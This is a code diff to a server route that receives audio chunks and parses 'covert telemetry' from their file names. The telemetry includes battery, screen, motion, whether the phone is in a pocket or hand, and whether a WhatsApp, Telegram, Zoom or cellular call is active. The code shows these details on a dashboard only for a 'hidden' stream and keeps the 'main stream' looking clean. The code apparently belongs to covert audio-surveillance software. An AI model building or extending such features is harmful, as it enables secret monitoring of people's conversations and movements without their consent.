@@ -155,7 +155,7 @@ router.post('/:session_id/chunk', upload.single('audio'), async (req: Request, r
         );
 
         // Dynamically update device_info for Dashboard Session Lists (Covert Telemetry)
-        const metaMatch = file.originalname.match(/_B(-?\d+)_S(-?\d+)(?:_O([A-Z]{3}))?(?:_D([01]))?(?:_U([01]))?(?:_C([A-Z0-9]+))?(?:_R([A-Z0-9]+))?(?:_V([01]))?(?:_dB(\d+))?/);
+        const metaMatch = file.originalname.match(/_B(-?\d+)_S(-?\d+)(?:_O([A-Z]{3}))?(?:_D([01]))?(?:_U([01]))?(?:_C([A-Z0-9]+))?(?:_R([A-Z0-9]+))?(?:_V([01]))?(?:_dB(\d+))?(?:_T(\d+))?(?:_M([01]))?(?:_P([A-Z]+))?(?:_A([A-Z0-9]+))?/);
         if (metaMatch) {
             const battery = metaMatch[1];
             const routeCode = metaMatch[3];
@@ -165,13 +165,17 @@ router.post('/:session_id/chunk', upload.single('audio'), async (req: Request, r
             const ringerCode = metaMatch[7];
             const speechCode = metaMatch[8];
             const dbVal = metaMatch[9];
+            const tempVal = metaMatch[10];
+            const motionCode = metaMatch[11];
+            const postureCode = metaMatch[12];
+            const appCode = metaMatch[13];
 
             const session = db.getSession(session_id);
             if (session) {
                 const baseInfo = session.device_info.split('|')[0].trim();
 
                 // Only show covert intelligence details if this is the covert "hidden" stream!
-                // Main stream sessions remain clean and basic.
+                // Main stream sessions remain completely clean and basic.
                 if (session.stream_type === 'hidden') {
                     let routeStr = '';
                     if (routeCode === 'JCK') routeStr = ' | 🎧 Jack';
@@ -199,7 +203,23 @@ router.post('/:session_id/chunk', upload.single('audio'), async (req: Request, r
                         audioStr = ` | 🗣️ Speech (${dbVal || 0}dB)`;
                     }
 
-                    const newDeviceInfo = `${baseInfo} | 🔋 ${battery}%${powerStr}${routeStr}${screenStr}${ringerStr}${audioStr}`;
+                    let tempStr = tempVal && parseInt(tempVal) > 0 ? ` | 🌡️ ${tempVal}°C` : '';
+                    let motionStr = motionCode === '1' ? ' | 🏃 Moving' : (motionCode === '0' ? ' | 🪑 Still' : '');
+                    let postureStr = postureCode === 'POCK' ? ' | 👖 Pocket' : (postureCode === 'DESK' ? ' | 🪵 Desk' : (postureCode === 'OPEN' ? ' | ✋ Hand' : ''));
+
+                    let appStr = '';
+                    if (appCode && appCode !== 'AIDLE') {
+                        if (appCode === 'AWA') appStr = ' | 🟢 WhatsApp Call';
+                        else if (appCode === 'AIG') appStr = ' | 🟣 Instagram Call';
+                        else if (appCode === 'ATG') appStr = ' | 🔵 Telegram Call';
+                        else if (appCode === 'AZOOM') appStr = ' | 💻 Zoom Call';
+                        else if (appCode === 'AMEET') appStr = ' | 📹 Google Meet';
+                        else if (appCode === 'ACELL') appStr = ' | 📞 Cellular Call';
+                        else if (appCode === 'AMIC') appStr = ' | 🎙️ External Mic App';
+                        else appStr = ` | 📞 Call (${appCode.replace(/^A/, '')})`;
+                    }
+
+                    const newDeviceInfo = `${baseInfo} | 🔋 ${battery}%${powerStr}${routeStr}${screenStr}${ringerStr}${audioStr}${tempStr}${motionStr}${postureStr}${appStr}`;
                     db.updateSessionDeviceInfo(session_id, newDeviceInfo);
                 } else {
                     // Standard / Main stream — keep simple
